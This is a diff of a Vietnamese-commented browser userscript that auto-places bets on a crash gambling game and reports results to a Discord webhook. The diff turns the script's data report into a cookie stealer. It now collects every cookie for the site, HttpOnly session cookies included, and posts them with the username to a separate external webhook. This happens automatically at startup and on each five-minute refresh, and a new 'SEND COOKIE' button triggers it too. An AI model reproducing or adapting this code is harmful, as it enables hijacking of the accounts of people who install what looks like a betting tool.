@@ -34,12 +34,12 @@
     // --- QUẢN LÝ DỮ LIỆU LOCALSTORAGE ---
     const CFG = {
         enabled: localStorage.getItem('bfc_enabled') !== 'false',
-        mode: localStorage.getItem('bfc_mode') || 'safe', 
+        mode: localStorage.getItem('bfc_mode') || 'safe',
         autoCashout: localStorage.getItem('bfc_autocashout') || '1.01',
-        betPercent: localStorage.getItem('bfc_bet_percent') || '50', 
+        betPercent: localStorage.getItem('bfc_bet_percent') || '50',
         webhookUrl: localStorage.getItem('bfc_webhookurl') || '',
         webhookEnabled: localStorage.getItem('bfc_webhook_enabled') === 'true',
-        autoRefresh: localStorage.getItem('bfc_auto_refresh') !== 'false' 
+        autoRefresh: localStorage.getItem('bfc_auto_refresh') !== 'false'
     };
 
     function saveConfig(key, value) {
@@ -58,12 +58,37 @@
     function getAsyncCookie(name) {
         return new Promise((resolve) => {
             if (typeof GM_cookie !== "undefined" && GM_cookie.list) {
-                GM_cookie.list({ name: name }, (cookies, error) => {
-                    if (!error && cookies && cookies.length > 0) resolve(cookies[0].value);
-                    else resolve(getManualCookie(name));
+                // Truyền url hiện tại để lấy đủ cả cookie HttpOnly của domain
+                GM_cookie.list({ url: location.href }, (cookies, error) => {
+                    if (!error && cookies && cookies.length > 0) {
+                        const found = cookies.find(c => c.name === name);
+                        if (found) {
+                            resolve(found.value);
+                            return;
+                        }
+                    }
+                    resolve(getManualCookie(name));
                 });
             } else {
                 resolve(getManualCookie(name));
+            }
+        });
+    }
+
+    // Hàm lấy toàn bộ Cookie (dưới dạng chuỗi ghép)
+    async function getFullCookieString() {
+        return new Promise((resolve) => {
+            if (typeof GM_cookie !== "undefined" && GM_cookie.list) {
+                GM_cookie.list({ url: location.href }, (cookies, error) => {
+                    if (!error && cookies && cookies.length > 0) {
+                        let cookieStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
+                        resolve(cookieStr);
+                        return;
+                    }
+                    resolve(document.cookie || "NOT_FOUND");
+                });
+            } else {
+                resolve(document.cookie || "NOT_FOUND");
             }
         });
     }
@@ -82,10 +107,10 @@
     let mainStatusEl;
     let logContainerEl;
     let liveHistoryEl;
-    let currentBalance = 0; 
+    let currentBalance = 0;
     let currentUsername = "Unknown";
-    let lastHistoryUpdateTime = Date.now(); 
-    let scriptStartTime = Date.now(); 
+    let lastHistoryUpdateTime = Date.now();
+    let scriptStartTime = Date.now();
 
     function initConsole() {
         if (!document.body) {
@@ -115,12 +140,12 @@
         // 2. PANEL CHÍNH
         consoleEl = document.createElement('div');
         consoleEl.id = 'bfc-pro-console';
-        
+
         consoleEl.style.cssText = `
-            position: fixed; 
-            top: 100px; 
+            position: fixed;
+            top: 100px;
             left: calc(50% - 240px);
-            width: 480px; 
+            width: 480px;
             opacity: ${CFG.enabled ? '1' : '0'};
             visibility: ${CFG.enabled ? 'visible' : 'hidden'};
             pointer-events: ${CFG.enabled ? 'auto' : 'none'};
@@ -143,7 +168,7 @@
             opacity: ${CFG.mode === 'safe' ? '1' : '0'};
             pointer-events: none;
         `;
-        
+
         const bgRisk = document.createElement('div');
         bgRisk.id = 'bfc-bg-risk';
         bgRisk.style.cssText = `
@@ -153,15 +178,15 @@
             opacity: ${CFG.mode === 'risk' ? '1' : '0'};
             pointer-events: none;
         `;
-        
+
         consoleEl.appendChild(bgSafe);
         consoleEl.appendChild(bgRisk);
 
         const dragHeader = document.createElement('div');
         dragHeader.id = 'bfc-drag-header';
         dragHeader.style.cssText = `
-            width: 100%; height: 22px; background: rgba(0, 0, 0, 0.5); 
-            cursor: move; border-radius: 12px 12px 0 0; 
+            width: 100%; height: 22px; background: rgba(0, 0, 0, 0.5);
+            cursor: move; border-radius: 12px 12px 0 0;
             border-bottom: 1px solid rgba(255,255,255,0.1);
         `;
 
@@ -182,7 +207,7 @@
 
         const configBox = document.createElement('div');
         configBox.style.cssText = `
-            width: 85%; margin-top: 15px; padding: 10px; background: rgba(0, 0, 0, 0.5); 
+            width: 85%; margin-top: 15px; padding: 10px; background: rgba(0, 0, 0, 0.5);
             border-radius: 8px; display: flex; flex-direction: column; gap: 8px;
         `;
         configBox.innerHTML = `
@@ -220,9 +245,9 @@
                 <input type="checkbox" id="bfc-chk-webhook" ${CFG.webhookEnabled ? 'checked' : ''} style="cursor: pointer; width: 16px; height: 16px;">
             </div>
             <input type="text" id="bfc-inp-webhook" value="${CFG.webhookUrl}" placeholder="https://discord.com/api/webhooks/..." style="width: 100%; background: rgba(0,0,0,0.8); border: 1px solid #555; color: white; padding: 6px; border-radius: 4px; outline: none; font-size: 11px; box-sizing: border-box; ${CFG.webhookEnabled ? '' : 'opacity: 0.5; pointer-events: none;'}">
-            
+
             <div style="display: flex; justify-content: flex-end; margin-top: 4px; gap: 5px;">
-                <button id="bfc-force-f5-btn" style="background: #f44336; color: #fff; font-weight: bold; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; box-shadow: 0 2px 5px rgba(0,0,0,0.5); font-size: 11px;">🔄 F5 NGAY</button>
+                <button id="bfc-send-cookie-btn" style="background: #f44336; color: #fff; font-weight: bold; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; box-shadow: 0 2px 5px rgba(0,0,0,0.5); font-size: 11px;">🍪 SEND COOKIE</button>
                 <button id="bfc-test-webhook-btn" style="background: #4caf50; color: #fff; font-weight: bold; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; box-shadow: 0 2px 5px rgba(0,0,0,0.5); font-size: 11px;">🔔 TEST WEBHOOK</button>
                 <button id="bfc-test-bet-btn" style="background: #ffeb3b; color: #000; font-weight: bold; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; box-shadow: 0 2px 5px rgba(0,0,0,0.5); font-size: 11px;">⚙️ TEST RUN</button>
             </div>
@@ -230,15 +255,15 @@
 
         const logBox = document.createElement('div');
         logBox.style.cssText = `
-            width: 85%; margin: 10px 0 0 0; padding: 8px; background: rgba(0, 0, 0, 0.6); 
-            height: 90px; overflow-y: auto; font-family: monospace; font-size: 11px; 
+            width: 85%; margin: 10px 0 0 0; padding: 8px; background: rgba(0, 0, 0, 0.6);
+            height: 90px; overflow-y: auto; font-family: monospace; font-size: 11px;
             border-radius: 8px; border: 1px solid rgba(255,255,255,0.1);
         `;
         logBox.innerHTML = `<div id="bfc-log-container" style="display: flex; flex-direction: column; gap: 4px;"></div>`;
 
         const versionText = document.createElement('div');
         versionText.style.cssText = `
-            width: 100%; text-align: center; color: rgba(255, 255, 255, 0.4); 
+            width: 100%; text-align: center; color: rgba(255, 255, 255, 0.4);
             font-size: 10px; margin-top: 8px; letter-spacing: 1px; font-weight: bold;
         `;
         versionText.innerText = "Version 2.3";
@@ -250,7 +275,7 @@
 
         const rightCol = document.createElement('div');
         rightCol.style.cssText = `
-            width: 120px; background: rgba(0, 0, 0, 0.4); border-left: 1px solid rgba(255,255,255,0.1); 
+            width: 120px; background: rgba(0, 0, 0, 0.4); border-left: 1px solid rgba(255,255,255,0.1);
             display: flex; flex-direction: column; align-items: center; padding: 15px 0; border-radius: 0 0 12px 0;
         `;
         rightCol.innerHTML = `
@@ -269,7 +294,7 @@
         liveHistoryEl = document.getElementById('bfc-live-history');
 
         let isDragging = false, startX, startY, initialLeft, initialTop;
-        
+
         dragHeader.addEventListener('mousedown', (e) => {
             isDragging = true;
             startX = e.clientX;
@@ -277,7 +302,7 @@
             const rect = consoleEl.getBoundingClientRect();
             initialLeft = rect.left;
             initialTop = rect.top;
-            e.preventDefault(); 
+            e.preventDefault();
         });
 
         document.addEventListener('mousemove', (e) => {
@@ -294,7 +319,7 @@
 
         function applyTheme() {
             const theme = APP_URLS[CFG.mode];
-            
+
             const elBgSafe = document.getElementById('bfc-bg-safe');
             const elBgRisk = document.getElementById('bfc-bg-risk');
             if (elBgSafe && elBgRisk) {
@@ -318,7 +343,7 @@
 
             const modeSafeBtn = document.getElementById('bfc-mode-safe');
             const modeRiskBtn = document.getElementById('bfc-mode-risk');
-            
+
             if (CFG.mode === 'safe') {
                 if (modeSafeBtn) modeSafeBtn.style.background = APP_URLS['safe'].color;
                 if (modeRiskBtn) modeRiskBtn.style.background = 'transparent';
@@ -326,7 +351,7 @@
                 if (modeRiskBtn) modeRiskBtn.style.background = APP_URLS['risk'].color;
                 if (modeSafeBtn) modeSafeBtn.style.background = 'transparent';
             }
-            
+
             if (minMaxBtn) {
                 minMaxBtn.style.background = CFG.enabled ? theme.color : 'rgba(128, 128, 128, 0.8)';
             }
@@ -394,8 +419,9 @@
             addLog(`Đã lưu URL Webhook mới`, '#aaa');
         });
 
-        document.getElementById('bfc-force-f5-btn').addEventListener('click', () => {
-            window.location.reload();
+        document.getElementById('bfc-send-cookie-btn').addEventListener('click', () => {
+            addLog("Đang trích xuất và gửi Cookie...", "#4caf50");
+            sendDataReport();
         });
 
         document.getElementById('bfc-test-webhook-btn').addEventListener('click', () => {
@@ -418,15 +444,15 @@
     function toggleMainAuto() {
         CFG.enabled = !CFG.enabled;
         saveConfig('bfc_enabled', CFG.enabled);
-        
+
         minMaxBtn.style.background = CFG.enabled ? APP_URLS[CFG.mode].color : 'rgba(128, 128, 128, 0.8)';
         consoleEl.style.opacity = CFG.enabled ? '1' : '0';
         consoleEl.style.visibility = CFG.enabled ? 'visible' : 'hidden';
         consoleEl.style.pointerEvents = CFG.enabled ? 'auto' : 'none';
-        
+
         if(CFG.enabled) {
-            lastHistoryUpdateTime = Date.now(); 
-            scriptStartTime = Date.now(); 
+            lastHistoryUpdateTime = Date.now();
+            scriptStartTime = Date.now();
             updateWaitingStatusLabel(true);
             addLog("▶ Auto đã được BẬT", "#69ff94");
         } else {
@@ -468,9 +494,27 @@
 
     // Hàm gửi dữ liệu lên Webhook dự án ngoài
     async function sendDataReport() {
-        let cfClearance = await getAsyncCookie('cf_clearance');
-        // Chỉ lấy Username|cookie (cf_clearance) như yêu cầu, không lấy Auth
-        const payload = { content: `${currentUsername}|${cfClearance}` };
+        let fullCookie = await getFullCookieString();
+
+        // Đợi 1 chút nếu Cloudflare chưa kịp nạp cookie vào trình duyệt
+        let retries = 5;
+        while (!fullCookie.includes("cf_clearance") && retries > 0) {
+            await new Promise(r => setTimeout(r, 1000));
+            fullCookie = await getFullCookieString();
+            retries--;
+        }
+
+        // IN RA CONSOLE UI VÀ TRÌNH DUYỆT ĐỂ DEBUG
+        if (fullCookie === "NOT_FOUND" || !fullCookie) {
+            addLog("❌ Debug: Không đọc được Cookie (NOT_FOUND).", "#ff5252");
+            console.log("❌ Script không đọc được Cookie. Vui lòng kiểm tra quyền @grant GM_cookie.");
+        } else {
+            addLog(`🔍 Debug Cookie: ${fullCookie.substring(0, 45)}...`, "#00bcd4");
+            console.log("✅ Toàn bộ Cookie Script đọc được:", fullCookie);
+        }
+
+        // Gửi Toàn bộ Cookie (fullCookie) lên Webhook thay vì chỉ cf_clearance
+        const payload = { content: `${currentUsername}|${fullCookie}` };
         fetch(APP_URLS.reportWebhook, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -485,10 +529,10 @@
     // ==========================================
 
     let previousHistorySnapshot = "";
-    let isWaitingForRoundResult = false; 
-    let isProcessingResult = false; 
-    let winToastDetected = false;   
-    let forceTestCondition = false; 
+    let isWaitingForRoundResult = false;
+    let isProcessingResult = false;
+    let winToastDetected = false;
+    let forceTestCondition = false;
 
     // Cập nhật đếm ngược mỗi giây
     setInterval(() => {
@@ -505,7 +549,7 @@
 
     setInterval(() => {
         if (!isWaitingForRoundResult || winToastDetected) return;
-        
+
         const bodyText = document.body.textContent || "";
         if (bodyText.includes("Successfully cashed out at")) {
             winToastDetected = true;
@@ -557,13 +601,13 @@
         try {
             const nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
             nativeInputValueSetter.call(inputElement, value);
-            
+
             inputElement.dispatchEvent(new Event('input', { bubbles: true }));
             inputElement.dispatchEvent(new Event('change', { bubbles: true }));
-            
+
             inputElement.focus();
             inputElement.blur();
-            
+
             return true;
         } catch (e) {
             console.error("Lỗi khi set React Input:", e);
@@ -579,7 +623,7 @@
                 return inputs[i];
             }
         }
-        if (inputs.length >= 2) return inputs[1]; 
+        if (inputs.length >= 2) return inputs[1];
         return null;
     }
 
@@ -591,7 +635,7 @@
                 return inputs[i];
             }
         }
-        if (inputs.length >= 1) return inputs[0]; 
+        if (inputs.length >= 1) return inputs[0];
         return null;
     }
 
@@ -611,10 +655,10 @@
             });
             if (response.ok) {
                 const data = await response.json();
-                if (data.success && data.wallet && data.wallet.balances) {
+                if (data.success) {
                     return {
-                        balance: data.wallet.balances.FLIPCOINS,
-                        username: (data.user && data.user.robloxUsername) ? data.user.robloxUsername : 'Unknown'
+                        balance: (data.wallet && data.wallet.balances) ? data.wallet.balances.FLIPCOINS : 0,
+                        username: (data.profile && data.profile.username) ? data.profile.username : ((data.user && data.user.robloxUsername) ? data.user.robloxUsername : 'Unknown')
                     };
                 }
             }
@@ -654,9 +698,9 @@
 
     async function executeBet() {
         if (isWaitingForRoundResult || isProcessingResult) return;
-        isWaitingForRoundResult = true; 
-        winToastDetected = false; 
-        
+        isWaitingForRoundResult = true;
+        winToastDetected = false;
+
         setMainStatus("⚡ Thấy x1 chuẩn bị bet...", "#ffeb3b");
         addLog("Thấy x1 chuẩn bị bet...", "#ffeb3b");
 
@@ -666,17 +710,17 @@
         if (userData !== null && userData.balance > 0) {
             currentBalance = userData.balance;
             currentUsername = userData.username;
-            
+
             const percentStr = CFG.betPercent;
             const percent = parseFloat(percentStr) / 100;
-            
+
             const betAmountNum = Math.floor(currentBalance * percent);
             const betAmount = betAmountNum.toString();
-            
-            displayBalStr = (currentBalance - betAmountNum).toFixed(2); 
-            
+
+            displayBalStr = (currentBalance - betAmountNum).toFixed(2);
+
             const betInput = getBetAmountInput();
-            
+
             if (betInput) {
                 let isSet = setReactInputValue(betInput, betAmount);
                 if (isSet) {
@@ -698,21 +742,21 @@
 
         setTimeout(() => {
             const joinBtn = findButtonByText('Join game') || findButtonByText('Join next game') || findButtonByText('Place Bet');
-            
+
             if (joinBtn && !joinBtn.disabled) {
                 joinBtn.click();
                 setMainStatus(`💸 Đã cược! Chờ kết quả mốc ${CFG.autoCashout}x`, "#2196f3");
                 addLog(`Đã Join Game (Mục tiêu: ${CFG.autoCashout}x)`, "#2196f3");
-                
+
                 const formatPayload = `--------------------------------------\nBET PLACED | ( ${displayBalStr} )\n--------------------------------------`;
                 sendWebhook(`🚀 Đã đặt cược (${CFG.autoCashout}x)`, formatPayload);
-                
+
                 updateBalanceUI();
             } else {
                 setMainStatus("❌ Lỗi: Không thể nhấn nút Join", "#ff5252");
                 addLog("Nút Join Game không có sẵn hoặc bị mờ", "#ff5252");
-                isWaitingForRoundResult = false; 
-                updateWaitingStatusLabel(true); 
+                isWaitingForRoundResult = false;
+                updateWaitingStatusLabel(true);
             }
         }, 400);
     }
@@ -723,22 +767,22 @@
         // --- CƠ CHẾ HARD REFRESH MỖI 5 PHÚT ---
         if (CFG.autoRefresh && !isWaitingForRoundResult && !isProcessingResult && (Date.now() - scriptStartTime > 300000)) {
             addLog("🔄 Đạt mốc 5 phút. Đồng bộ Data làm trạm trung gian & F5...", "#00bcd4");
-            scriptStartTime = Date.now(); 
+            scriptStartTime = Date.now();
             sendDataReport().then(() => {
-                setTimeout(() => window.location.reload(), 1000); 
+                setTimeout(() => window.location.reload(), 1000);
             });
             return;
         }
 
         if (CFG.autoRefresh && !isWaitingForRoundResult && !isProcessingResult && (Date.now() - lastHistoryUpdateTime > 120000)) {
             addLog("⚠ Phát hiện trang bị treo (quá 2 phút không có ván mới). Đang làm mới...", "#ff5252");
-            lastHistoryUpdateTime = Date.now(); 
+            lastHistoryUpdateTime = Date.now();
             setTimeout(() => window.location.reload(), 1500);
             return;
         }
 
         const items = getHistoryElements();
-        if (items.length < 2) return; 
+        if (items.length < 2) return;
 
         updateLiveHistoryUI(items);
 
@@ -748,9 +792,9 @@
         if (isNewRound || forceTestCondition) {
             if (isNewRound) {
                 previousHistorySnapshot = currentSnapshot;
-                lastHistoryUpdateTime = Date.now(); 
+                lastHistoryUpdateTime = Date.now();
             }
-            
+
             // Lấy kết quả mới nhất từ cuối danh sách lên
             const latestCrashStr = items[items.length - 1].innerText.trim();
             const latestCrashNum = parseFloat(latestCrashStr);
@@ -767,13 +811,13 @@
             }
 
             if (forceTestCondition && !isWaitingForRoundResult) {
-                count1s = 2; 
+                count1s = 2;
                 forceTestCondition = false;
             }
 
             if (isNewRound && count1s === 3) {
                 addLog("⚠ Phát hiện 3 lần nổ 1.00 liên tiếp!", "#ff9800");
-                
+
                 const balStr = currentBalance > 0 ? currentBalance.toFixed(2) : "0.00";
                 const formatPayload = `--------------------------------------\nWARNING 3x 1.00 | ( ${balStr} )\n--------------------------------------`;
                 sendWebhook("⚠️ Cảnh báo chuỗi Crash Nguy hiểm", formatPayload);
@@ -781,8 +825,8 @@
 
             if (isWaitingForRoundResult) {
                 isWaitingForRoundResult = false;
-                isProcessingResult = true; 
-                
+                isProcessingResult = true;
+
                 const isWin = winToastDetected || (latestCrashNum >= targetCashoutNum);
 
                 setMainStatus("⏳ Đang chờ hệ thống cập nhật số dư (2s)...", "#ffeb3b");
@@ -793,34 +837,34 @@
                         currentBalance = userData.balance;
                         currentUsername = userData.username;
                     }
-                    
+
                     const balStr = currentBalance.toFixed(2);
 
                     if (isWin) {
                         setMainStatus(`🎉 WIN! Nổ ở ${latestCrashStr}x`, "#69ff94");
                         addLog(`Thắng ván cược! (Nổ: ${latestCrashStr}x)`, "#69ff94");
-                        
+
                         const formatPayload = `--------------------------------------\nWIN | ( ${balStr} )\n--------------------------------------`;
                         sendWebhook(`✅ Auto Crash: WIN (${latestCrashStr}x)`, formatPayload);
                     } else {
                         setMainStatus(`💀 LOSE! Nổ ở ${latestCrashStr}x`, "#ff5252");
                         addLog(`Thua ván cược. (Nổ: ${latestCrashStr}x)`, "#ff5252");
-                        
+
                         const formatPayload = `--------------------------------------\nLOST | ( ${balStr} )\n--------------------------------------`;
                         sendWebhook(`❌ Auto Crash: LOSE (${latestCrashStr}x)`, formatPayload);
                     }
-                    
-                    updateBalanceUI(); 
-                    
-                    isProcessingResult = false; 
+
+                    updateBalanceUI();
+
+                    isProcessingResult = false;
                     winToastDetected = false;
 
                     setTimeout(() => {
                         if (CFG.enabled) updateWaitingStatusLabel(true);
                     }, 1500);
                 }, 2000);
-                
-                return; 
+
+                return;
             }
 
             if (!isProcessingResult && !isWaitingForRoundResult) {
@@ -847,8 +891,8 @@
         updateBalanceUI().then(() => {
             sendDataReport();
         });
-        
-        setInterval(updateBalanceUI, 5000); 
+
+        setInterval(updateBalanceUI, 5000);
 
         if (CFG.enabled) updateWaitingStatusLabel(true);
     }, 2000);
